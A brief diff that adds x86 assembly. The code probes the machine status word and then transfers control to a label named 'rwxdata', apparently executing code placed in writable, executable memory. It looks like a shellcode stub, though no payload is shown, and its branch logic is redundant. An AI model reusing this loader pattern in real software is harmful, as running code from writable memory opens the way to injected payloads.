@@ -1,0 +1,18 @@
+_start
+push ebp
+mov ebp esp
+sub esp 0x800
+fnclex
+fwait
+smsw eax
+test al 0x8
+jne rwxdata
+cdq
+smsw eax
+test al 0x2
+je rwxdata
+xor ecx ecx
+xor ebx ebx
+xor edx edx
+mov eax rwxdata
+jmp eax
